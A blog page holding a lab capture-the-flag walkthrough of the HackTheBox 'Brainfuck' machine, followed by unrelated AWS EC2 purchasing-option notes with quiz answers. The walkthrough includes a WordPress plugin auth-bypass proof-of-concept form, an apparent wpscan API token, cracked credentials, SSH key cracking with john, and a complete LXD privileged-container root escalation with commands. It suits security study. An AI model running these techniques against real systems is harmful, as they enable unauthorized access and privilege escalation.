<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10274253">Day 14 網頁分析 - Web Application Analysis (wpscan - WordPress vulnerability scanner) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>
<p><code>WPScan</code> 是一個掃描 <code>WordPress</code> 漏洞的黑盒子掃描器，它可以為所有 <code>Web</code> 開發人員掃描 <code>WordPress</code><br> 漏洞並在他們開發前找到並解決問題。</p>
<p>通過外掛,主題的漏洞去滲透 <code>Wordpress</code> 站點，於是 <code>WPScan</code> 應運而生，收集 <code>Wordpress</code> 的各種漏洞，形成一個 <code>Wordpress</code> 專用掃描器。</p>
<p>該掃描器可以實現獲取站點使用者名稱，獲取安裝的所有外掛、主題，以及存在漏洞的外掛、主題，並提供漏洞資訊。同時還可以實現對未加防護的</p>
<p><a target="_blank" rel="noopener" href="https://www.itread01.com/hkyxlhk.html"></a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wpscan.com/wpscan-user-documentation/">WPScan User Documentation - WPScan WordPress Security</a></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/how-to-use-wpscan/">How to use WPScan | VK9 Security</a></p>
<ul>
<li><p>wpscan –url <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> –disable-tls-checks –api-token “hrq4GRSi8E4gndSKawwwmLVImT3xWzlRSE7osdZsBF8”</p>
</li>
<li><p><strong>The following enumeration options exist:</strong></p>
<p>  <strong><code>vp</code> (Vulnerable plugins)</strong></p>
<p>  <strong><code>ap</code> (All plugins)</strong></p>
<p>  <strong><code>p</code> (Popular plugins)</strong></p>
<p>  <strong><code>vt</code> (Vulnerable themes)</strong></p>
<p>  <strong><code>at</code> (All themes)</strong></p>
<p>  <strong><code>t</code> (Popular themes)</strong></p>
<p>  <strong><code>tt</code> (Timthumbs)</strong></p>
<p>  <strong><code>cb</code> (Config backups)</strong></p>
<p>  <strong><code>dbe</code> (Db exports)</strong></p>
<p>  <strong><code>u</code> (User IDs range. e.g: u1-5)</strong></p>
<p>  <strong><code>m</code> (Media IDs range. e.g m1-15)</strong></p>
</li>
</ul>
<p>Before start, need to get API, if I not get this API, when I execute the commend, something results can’t appears</p>
<p><img src="/img/Brainfuck_Untitled_6.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wp-support-plus-responsive-ticket-system</span><br><span class="line"> | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/</span><br><span class="line"> | Last Updated: 2019-09-03T07:57:00.000Z</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 9.1.2</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 – Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/40939/</span><br><span class="line"> |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution (RCE)</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.0.3 - Multiple Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.0.3</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131</span><br><span class="line"> |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.1.2 - Stored XSS</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.1.2</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331</span><br><span class="line"> |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 - Privilege Escalation</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f</span><br><span class="line"> |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html</span><br><span class="line"> |      - https://packetstormsecurity.com/files/140413/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596</span><br><span class="line"> |</span><br><span class="line"> | Version: 7.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>Version 7.1.3 wp-support-plus-responsive-ticket-system</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41006"></a></p>
<p>when I browse exploit.db I find this vuln, maybe can use it</p>
<p>According to an exploit that is used incorrectly, wp_set_auth_cookie can log in without a password.</p>
<p>POC:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://wp/wp-admin/admin-ajax.php&quot;</span>&gt;</span></span><br><span class="line">	Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;administrator&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sth&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;loginGuestFacebook&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>So use this POC, need to change some place </p>
<ul>
<li><p>vim exploitpoc.html</p>
<p>  <img src="/img/Brainfuck_Untitled_7.png" alt="Untitled"></p>
</li>
</ul>
<p>Browse to the exploitpoc.html file on the localhost server as shown below and click the Login tab.</p>
<p><img src="/img/Brainfuck_Untitled_8.png" alt="Untitled"></p>
<p>Run a Python script for file transfer over port 80.</p>
<ul>
<li>python -m http.server 80</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_9.png" alt="Untitled"></p>
<p>when I click the login I well reach this page</p>
<p><img src="/img/Brainfuck_Untitled_10.png" alt="Untitled"></p>
<p>Reorganize <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> this page</p>
<p><img src="/img/Brainfuck_Untitled_11.png" alt="Untitled"></p>
<p> log in as anyone without knowing the password due to misuse of wp_set_auth_cookie(). Then you can visit <a target="_blank" rel="noopener" href="https://brainfuck/">https://brainfuck</a> again to enter the admin panel.</p>
<p><img src="/img/Brainfuck_Untitled_12.png" alt="Untitled"></p>
<p>There is account information under the SMTP plugin, but the password is not displayed, so use F12 to view the information</p>
<ul>
<li>user: orestis</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_13.png" alt="Untitled"></p>
<ul>
<li>password:kHGuERB29DNiNE</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_14.png" alt="Untitled"></p>
<ul>
<li><p>Telnet</p>
<ul>
<li>通訊協議</li>
<li>遠端登入工具</li>
<li>可以檢視埠是否可訪問</li>
<li>TCP&#x2F;IP協議家族中的一員</li>
<li>提供在本地計算機上完成遠端主機工作的能力</li>
<li>使用者使用telnet程式連線到伺服器</li>
<li>輸入命令在伺服器上執行</li>
<li>常用於遠端控制Web伺服器</li>
</ul>
</li>
<li><p>SMTP (簡易郵件傳輸通訊協定)</p>
<ul>
<li>透過網路傳輸的技術標準</li>
<li>允許電腦和伺服器交換資料</li>
<li>標準化了電子郵件從寄件人到收件人的傳輸方式</li>
<li>郵件傳遞通訊協定</li>
<li>不是郵件擷取通訊協定</li>
</ul>
</li>
</ul>
<p>Through the telnet command: <strong>telnet 10.10.10.17 110</strong>, establish a connection with the SMTP server and log in to the orestis account</p>
<ul>
<li>POP3 - TCP 110 &#x2F; POP3 protocol uses this port (unencrypted)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The mail client is used to collect mail from the server. </span><br><span class="line">Security Question: **Reusable clear text passwords.** </span><br><span class="line">– Connections and attempts are not audited and therefore subject to grinding. </span><br><span class="line">– Some POP3 server versions have buffer overflow issues.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.auditmypc.com/tcp-port-110.asp">TCP 110 - Port Protocol Information and Warning!</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)</span><br><span class="line">|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)</span><br><span class="line">|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)</span><br><span class="line">25/tcp  open  smtp?</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: TOP UIDL PIPELINING CAPA SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE</span><br><span class="line">143/tcp open  imap     Dovecot imapd</span><br><span class="line">|_imap-capabilities: listed have more ID OK LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 post-login SASL-IR IDLE capabilities LITERAL+ ENABLE IMAP4rev1</span><br><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Not valid before: 2017-04-13T11:19:29</span><br><span class="line">|_Not valid after:  2027-04-11T11:19:29</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.10.0 (Ubuntu)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://kb.website-solution.net/%E5%A6%82%E4%BD%95%E9%80%8F%E9%81%8E-telnet-%E6%A8%A1%E5%BC%8F%E6%B8%AC%E8%A9%A6-pop3-%E9%9B%BB%E9%83%B5/">如何透過 Telnet 模式測試 POP3 電郵? - 卓智互聯網 網頁寄存 知識庫</a></p>
<p><img src="/img/Brainfuck_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>LIST ⇒ Displays the archive directory.</li>
<li>retr 1 ⇒ FTP Client 向 Server 複製一個檔案，也就是由 Server 端下載一個檔案到 Client 端</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_16.png" alt="Untitled"></p>
<ul>
<li>retr 2</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_17.png" alt="Untitled"></p>
<p>I think…I find the important Information</p>
<p>Any “secret” has a user name and password to log in</p>
<p>I realized that this credential can be connected to the <strong>sup3rs3cr3t.Brainfuck</strong> I explored in my web browser htb 。</p>
<ul>
<li>username: orestis</li>
<li>password: kIEnnfEKJ#9UmdO</li>
</ul>
<p>when I try to browse this page, and log in</p>
<p><img src="/img/Brainfuck_Untitled_18.png" alt="Untitled"></p>
<p>log in access, see the Super Secret Forum</p>
<p><img src="/img/Brainfuck_Untitled_19.png" alt="Untitled"></p>
<p>into the key I see that ..I noticed the chat between admin and orestis. It looks like maybe orestis and the admin shared some confidential information in this chat, but in the admin’s last reply, it looks like he’s secretly sharing any encrypted URLs</p>
<p><img src="/img/Brainfuck_Untitled_20.png" alt="Untitled"></p>
<p>Because I’m not sure what the content here is, I decided to check the content of SSH Access page</p>
<p>Password login is permanently disabled. so..user want to find the key to unlock </p>
<p><img src="/img/Brainfuck_Untitled_21.png" alt="Untitled"></p>
<p>Ortis lost the SSH login key and asked the administrator to send the key privately</p>
<p>It seems that some rules have been found, and maybe they can decrypt other content along the way.</p>
<p><img src="/img/Brainfuck_Untitled_22.png" alt="Untitled"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line">Orestis - Hacking for fun and profit</span><br><span class="line">##change..</span><br><span class="line">QbqquzsPnhekxsdpifcafhfzdmgzt</span><br><span class="line">OrestisHackingforfunandprofit</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_23.png" alt="Untitled"></p>
<p>I guess mnvze:&#x2F;&#x2F;10.10.10.17&#x2F;8zb5ra10m915218697q1h658wfoq0zc8&#x2F;frmfycu&#x2F;sp_ptr</p>
<ul>
<li>mnvze:&#x2F;&#x2F; maybe is https:&#x2F;&#x2F;</li>
</ul>
<p>I had pasted above ciphertext inside encipher textbox and decryption key inside decipher textbox and received <strong>decipher message</strong> “CkmybraInfuckmybrainfuckmybra”</p>
<p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/vigenere/#">Vigenère</a></p>
<p><img src="/img/Brainfuck_Untitled_24.png" alt="Untitled"></p>
<ul>
<li>key ⇒ fuckmybrain</li>
</ul>
<p>In the key chat room screen, admin provides a ciphertext URL to download id_rsa for ssh login as orestis</p>
<ul>
<li>mnvze:&#x2F;&#x2F;zsrivszwm.rfz&#x2F;8cr5ai10r915218697i1w658enqc0cs8&#x2F;ozrxnkc&#x2F;ub_sja</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_25.png" alt="Untitled"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa">https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_26.png" alt="Untitled"></p>
<p>when I download it, the file need enter the passwd</p>
<p><img src="/img/Brainfuck_Untitled_27.png" alt="Untitled"></p>
<ul>
<li>python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; john.priv</li>
<li>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt john.priv</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/john/">john | Kali Linux Tools</a></p>
<p><img src="/img/Brainfuck_Untitled_28.png" alt="Untitled"></p>
<h1 id="ssh2johnn-Lxd-權限提升"><a href="#ssh2johnn-Lxd-權限提升" class="headerlink" title="ssh2johnn &amp;&amp; Lxd 權限提升"></a>ssh2johnn &amp;&amp; Lxd 權限提升</h1><p><strong>Ssh2john 是 John The Reaper 套件的一部分。這是一個腳本，它基本上將 [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) ] 私鑰轉換為 john 格式，以便以後使用 JtR 進行破解</strong></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/ssh2john-how-to/">Ssh2john how to | VK9 Security</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd Privilege Escalation - Hacking Articles</a></p>
<p>**Linux Container (LXC)**通常被認為是一種輕量級虛擬化技術，介於 chroot 和完全開發的虛擬機之間，它創建了一個盡可能接近 Linux 安裝的環境，但不需要單獨的內核。</p>
<p>**Linux 守護進程 (LXD)**是輕量級管理程序或輕量級容器管理程序。LXD 建立在 Docker 之前使用的稱為 LXC 的容器技術之上。它使用穩定的 LXC API 在後台完成所有容器管理，在頂部添加 REST API 並提供更簡單、更一致的用戶體驗。</p>
<p>get this passwd,and login the SSH</p>
<ul>
<li>3poulakia!</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_29.png" alt="Untitled"></p>
<p>Now find user.txt and root.txt</p>
<ul>
<li>cat user.txt ⇒ 646ab926895979b1bbf5f76571fcc2b9</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_30.png" alt="Untitled"></p>
<p>The encrypt.sage has write the debuge.txt and output.txt</p>
<p><img src="/img/Brainfuck_Untitled_31.png" alt="Untitled"></p>
<ul>
<li>debug.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br><span class="line">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br><span class="line">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br></pre></td></tr></table></figure>

<ul>
<li>cat output.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span><br></pre></td></tr></table></figure>

<p>Elevated privileges are now required to find the root.txt file, my guess</p>
<p>The <strong>lxd</strong> authorization requires the access permission of the local account. The most important condition is that the user must be a member of the <strong>lxd group.</strong></p>
<p>It happens that this account is a member of the lxd group</p>
<p><img src="/img/Brainfuck_Untitled_32.png" alt="Untitled"></p>
<p>To escalate to root privileges, create an image with lxd</p>
<ol>
<li><strong>Steps to be performed on the attacker machine</strong>:</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download build-alpine in your local machine through the git repository.</li>
<li><input disabled="" type="checkbox"> Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.</li>
<li><input disabled="" type="checkbox"> Transfer the tar file to the host machine</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git </span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder </span><br><span class="line">./build-alpine</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_33.png" alt="Untitled"></p>
<p>now I need to cp the alpine-v3.13-x86_64-20210218_0139.tar.gz to my &#x2F;root path , because my server execution path is over there.</p>
<p>And need to set server port, go to the opening page again to confirm whether the opening is successful</p>
<ul>
<li>python -m http.server 8000</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_34.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_35.png" alt="Untitled"></p>
<ol>
<li><strong>Steps to be performed on the host machine:</strong></li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download the alpine image</li>
<li><input disabled="" type="checkbox"> Import image for lxd</li>
<li><input disabled="" type="checkbox"> Initialize the image inside a new container.</li>
<li><input disabled="" type="checkbox"> Mount the container inside the &#x2F;root directory</li>
</ul>
<p>Now you need to download the archive you just copied to root</p>
<ul>
<li>wget <a target="_blank" rel="noopener" href="http://10.10.16.11:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz">http://tun0ip:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_36.png" alt="Untitled"></p>
<p>After the image is built it can be added as an image to LXD as follows:</p>
<ul>
<li>lxc image import .&#x2F;alpine-v3.10-x86_64-20191008_1227.tar.gz –alias myimage</li>
</ul>
<p>use the list command to check the list of images</p>
<ul>
<li>lxc image list</li>
</ul>
<p>After executing the command, you can enter the container and cd &#x2F;mnt&#x2F;root to view all resources from the host.</p>
<ul>
<li>lxc init myimage ignite -c security.privileged&#x3D;true</li>
<li>lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</li>
<li>lxc start ignite</li>
<li>lxc exec ignite &#x2F;bin&#x2F;sh</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_37.png" alt="Untitled"></p>
<ul>
<li>cat root.txt ⇒ dcf81acb6c1e7d3545881b9a496daa6e</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AWS_EC2_Instance_Purchasing_Options" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AWS_EC2_Instance_Purchasing_Options/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.075Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AWS_EC2_Instance_Purchasing_Options/">
        AWS EC2 Instance Purchasing Options
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>On-Demand Instances 按需運行實例</p>
<ul>
<li>短期工作負載</li>
<li>獲得可預測的定價</li>
<li>按秒支付</li>
<li>第一分鐘後按秒計費</li>
<li>對於其他操作系統，將按小時計費</li>
<li>成本最高，沒有預付款，沒有長期承諾<ul>
<li>短期不間段的工作負載，如果無法預測應用程式的行為方式，推薦使用該解決方案</li>
</ul>
</li>
</ul>
<p>Reserved 保留實例</p>
<ul>
<li><p>指定期限為一年或三年，以獲得更多折扣</p>
<ul>
<li>是否想支付預付款或部分預付款或不預付款</li>
<li>所有前期當然給你最大的折扣金額</li>
</ul>
</li>
<li><p>特定AZ中保留容量</p>
</li>
<li><p>適用長期工作負載</p>
</li>
<li><p>長時間運行數據庫</p>
</li>
<li><p>不再需要保留的實例，可以在市場中購買或出售</p>
</li>
<li><p>穩定狀態使用的應用程式</p>
<ul>
<li>數據庫</li>
</ul>
</li>
<li><p>跟案需實例相比，他可為你提供72%的折扣，並保留特定的實例屬性</p>
<ul>
<li>實例類型、區域、租賃、操作系統</li>
</ul>
</li>
<li><p>Convertible Reserved Instances 可轉換的預留實例</p>
<ul>
<li>允許更改實例類型<ul>
<li>實例系列、操作系統、範圍、租約</li>
</ul>
</li>
<li>靈活的實例類型</li>
<li>隨時間推移改變實例類型</li>
<li>因為有更大靈活性，最多獲得66%折扣</li>
</ul>
</li>
</ul>
<p>Savings Plans ( 1 &amp; 3 years ) 節約計畫</p>
<ul>
<li>期限為一年和三年</li>
<li>不是承諾特定的Instances 類型</li>
<li>承諾以美元為單位的特定使用量</li>
<li>針對長期工作負載</li>
<li>根據長期使用情況獲得折扣，72%折扣</li>
<li>任何超出儲蓄計劃的使用都將以案需價格計算</li>
<li>會被鎖定到特定的實例家庭和地區</li>
<li>可以在不同系統之間切換</li>
<li>Flexible across:<ul>
<li>Instance Size (e.g.,m5.xlarge,m5.2xlarge)</li>
<li>.OS (e.g.,Linux,Windows)</li>
<li>Tenancy (Host,Dedicated,Default)</li>
</ul>
</li>
</ul>
<p>Spot Instances 現貨實例</p>
<ul>
<li>非常短工作附載</li>
<li>不適合關鍵的工作或數據庫</li>
<li>若工作負載具有故障恢復能力，非常適合他們<ul>
<li>批處理作業</li>
<li>數據分析</li>
<li>圖像處理</li>
<li>任何類型的分布式工作負載</li>
<li>具有靈活的開始和結束時間的工作負載</li>
</ul>
</li>
<li>定義了願意為現貨實例支付的最高價格<ul>
<li>如果現貨價格超過了，就會失去該實例</li>
</ul>
</li>
<li>非常便宜</li>
<li>但隨時會丟失Instances</li>
</ul>
<p>Dedicated Hosts 專用主機</p>
<ul>
<li>預定整個物理服務器並控制Instances 位置</li>
<li>可以訪問物理服務器本身</li>
<li>具有完全專用於你的用例的EC2實例容量實際物理服務器</li>
<li>如果你希望在以下情況中、或有合規性要求、需要使用現有服務器綁定軟體許可證(基於每插槽、每內核、每虛擬機軟體許可證進行計費)</li>
<li>訪問物理服務器並獲得專用主機</li>
<li>按需購買</li>
<li>按秒付費</li>
<li>預定一年或三年</li>
<li>AWS中最昂貴選項</li>
<li>實際需要預留一台物理服務器</li>
<li>使用案例是指你的軟體採用自帶許可證的許可模式</li>
<li>公司有很強的法規或合規性需求</li>
</ul>
<p><img src="/img/aws_purch1.png" alt="Untitled"></p>
<p>Dedicated Instances 專用實例</p>
<ul>
<li>意味沒有其他客戶會共享你的硬體</li>
<li>有些實例運行在專用於你的硬體上</li>
<li>可以與同一帳戶中的其他實例共享硬體</li>
<li>無法控制實例位置</li>
<li>意味著你在自己的硬體上有自己的實例</li>
</ul>
<p>Capacity Reservations 預留容量</p>
<ul>
<li>特定AZ中為任何持續時間預留容量</li>
</ul>
<blockquote>
<p>AWS AZ是一個區域(Region)中的一或多個資料中心。每個資料中心都有獨立的電源、網路等硬體設備，彼此以高速網路連接並加密傳輸資料，藉此達到冗余及提高可用性。</p>
</blockquote>
<ul>
<li>任意持續時間內保留特定AZ中的按需實例</li>
<li>需要時隨時訪問該容量</li>
<li>沒有時間承諾，可隨時保留容量或取消保留</li>
<li>沒有帳單折扣</li>
<li>唯一目的是保留容量</li>
<li>想獲得計費折扣，需要將其與區域保留實例或儲蓄計劃相結合</li>
<li>按需收費，按預留容量付費</li>
<li>不啟動他們仍然需要付費</li>
<li>非常需要在特定AZ中運行的短期不間斷工作負載</li>
</ul>
<p><img src="/img/aws_purch2.png" alt="Untitled"></p>
<p>哪種方案適合你? 以度假村為例</p>
<ul>
<li>On demand: coming and staying in resort whenever we like, we pay the full price</li>
<li>Reserved: like planning ahead and if we plan to stay for a long time, we may get a good discount.</li>
<li>Savings Plans: pay a certain amount per hour for certain period and stay in any room type (e.g.,<br>King, Suite, Sea View,…)</li>
<li>Spot instances: the hotel allows people to bid for the empty rooms and the highest bidder keeps the rooms. You can get kicked out at any time</li>
<li>Dedicated Hosts: We book an entire building of the resort</li>
<li>Capacity Reservations: you book a room for a period with full price even you don’t stay in it</li>
</ul>
<p><strong>Which EC2 Purchasing Option can provide you the biggest discount, but it is not suitable for critical jobs or databases?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Convertible Reserved Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
</ul>
<blockquote>
<p>Spot Instances are good for short workloads and this is the cheapest EC2 Purchasing Option. But, they are less reliable because you can lose your EC2 instance.</p>
</blockquote>
<p><strong>What should you use to control traffic in and out of EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Network Access Control List (NACL)</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Security Groups</strong></li>
<li><input disabled="" type="checkbox"> • <strong>IAM Policies</strong></li>
</ul>
<p><strong>How long can you reserve an EC2 Reserved Instance?</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>1 or 3 years</strong></li>
